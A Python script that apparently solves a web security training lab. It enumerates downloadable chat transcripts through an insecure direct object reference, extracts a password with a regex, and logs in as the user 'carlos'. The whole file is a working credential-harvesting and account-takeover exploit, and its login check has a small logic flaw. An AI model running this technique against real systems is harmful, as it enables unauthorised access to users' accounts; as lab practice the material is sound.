import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_password(s, url):
    for i in range(1,10):
        chatlog_url = url + "/download-transcript/%i.txt" % i
        sys.stdout.write("[+] Payload %s \r" % chatlog_url)
        sys.stdout.flush()
        r = s.get(chatlog_url, verify=False, proxies=proxies)
        if r.status_code == 200:
            try:
                password = re.search(r"\w{20}", r.text).group(0)
                print("\n[+] The password is %s" % password)
                return password
            except:
                continue
        sys.stdout.write("\033K[")
    print("\n[-] Did not found useful information. Exiting the script now")
    sys.exit(-1)


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token



def login_as_carlos(s, url, password):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)
    params = {
        'csrf' : csrf_token,
        'username' : 'carlos',
        'password' : password
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Log out" and "carlos" in r.text:
        print("[+] Logged-in as user carlos!")
        return
    else:
        print("[-] Mh, something did not work!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()

    print("\n[+] ### Lab: Insecure direct object references")
    print("[+] Insecure Direct Object Reference present in the webapp allows to browse static files and extraction of information like passwords\n")
    login_as_carlos(s, url, password=get_password(s, url))



if __name__ == "__main__":
    main()